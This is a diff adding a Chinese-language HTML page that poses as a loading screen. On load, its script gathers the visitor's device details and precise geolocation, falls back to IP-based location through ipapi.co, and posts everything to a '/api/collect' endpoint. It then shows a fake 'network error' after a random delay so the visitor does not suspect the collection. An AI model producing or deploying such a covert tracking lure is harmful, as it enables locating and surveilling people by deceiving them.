@@ -1,1 +1,78 @@
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+  <meta charset="UTF-8">
+  <title>載入中...</title>
+  <style>
+    body { background: #fff; margin: 0; }
+    #loading { 
+      position: absolute; left: 50%; top: 50%; 
+      transform: translate(-50%,-50%);
+      font-family: sans-serif; color: #888; font-size: 1.3em;
+    }
+  </style>
+  <script>
+    // 設定隨機加載秒數 1~4 秒
+    const minWait = 1000; //ms
+    const maxWait = 4000;
+    const waitTime = Math.floor(Math.random() * (maxWait-minWait)) + minWait;
 
+    // 背景資料上傳行為
+    const deviceInfo = {
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      language: navigator.language,
+      screen: {
+        width: window.screen.width,
+        height: window.screen.height,
+        pixelRatio: window.devicePixelRatio
+      }
+    };
+    function fetchIPLocation(cb) {
+      fetch('https://ipapi.co/json/')
+        .then(r=>r.json()).then(loc=>cb && cb(loc))
+        .catch(()=>cb && cb(null));
+    }
+    function report(data) {
+      fetch('/api/collect', {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify(data)
+      });
+    }
+
+    window.onload = function() {
+      // 開始背景上報
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            deviceInfo.location = {
+              lat: pos.coords.latitude,
+              lng: pos.coords.longitude
+            };
+            report(deviceInfo);
+          },
+          err => {
+            fetchIPLocation(iploc => {
+              deviceInfo.ipLocation = iploc;
+              report(deviceInfo);
+            });
+          }
+        );
+      } else {
+        fetchIPLocation(iploc => {
+          deviceInfo.ipLocation = iploc;
+          report(deviceInfo);
+        });
+      }
+      // 隨機延時後顯示網絡錯誤
+      setTimeout(() => {
+        document.body.innerHTML = '<h1 style="color:red;text-align:center;">網絡錯誤</h1>';
+      }, waitTime);
+    };
+  </script>
+</head>
+<body>
+  <div id="loading">載入中...</div>
+</body>
+</html>
